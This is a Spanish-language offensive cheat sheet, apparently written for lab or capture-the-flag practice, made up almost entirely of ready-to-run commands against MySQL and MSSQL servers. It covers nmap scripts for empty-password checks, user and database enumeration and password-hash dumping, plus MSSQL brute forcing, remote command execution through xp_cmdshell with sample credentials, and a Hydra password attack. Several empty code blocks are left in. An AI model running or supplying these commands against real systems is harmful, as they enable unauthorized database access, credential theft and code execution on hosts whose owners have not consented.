# Nmap

###### Para saber si podemos entrar sin contraseña:
`nmap 192.168.X.X -sV -p 3306 --script=mysql-empty-password`
###### Para ver información:
`nmap 192.168.X.X -sV -p 3306 --script=mysql-empty-info`
###### Usuarios
`nmap 192.168.X.X -sV -p 3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"`
###### Para ver bases de datos:
`nmap 192.168.X.X -sV -p 3306 --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''"`
###### Para ver directorios:
`nmap 192.168.X.X -sV -p 3306 --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''"`
###### Para ver un archivo:
`nmap 192.168.X.X -sV -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"`
###### Para dumpear hashes:
`nmap 192.168.X.X -sV -p 3306 --script=mysql-dump-hashes --script-args="username='root',password=''"`

```java

```
## Puerto 1433 (Windows)
###### Info del sistema:
`nmap 192.168.X.X -p 1433 --script ms-sql-info`

`nmap 192.168.X.X -p 1433 --script ms-sql-ntlm-info --script-args msssql.instance-port=1433`
###### Fuerza bruta:
`nmap 192.168.X.X -p 1433 --script ms-sql-brute --script-args userdb=/users.txt,passdb=/pass.txt`
###### Saber si podemos entrar sin contraseña:
`nmap 192.168.X.X -p 1433 --script ms-sql-empty-password`
###### Dumpear toda la base de datos con credenciales:
`nmap 192.168.X.X -p 1433 --script ms-sql-empty-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" -oN output.txt`
###### Dumpear hashes con unas credenciales:
`nmap 192.168.X.X -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria`
###### Ejecución remota de comandos (RCE) con credenciales:
`nmap 192.168.X.X -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="COMANDO"`
###### Leer un archivo:
`nmap 192.168.X.X -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt"`

```java

```

# Conexión con usuario `root`

`mysql -u root -h 10.10.10.10`

# Hydra

`hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt mysql://10.10.10.10`

```java

```

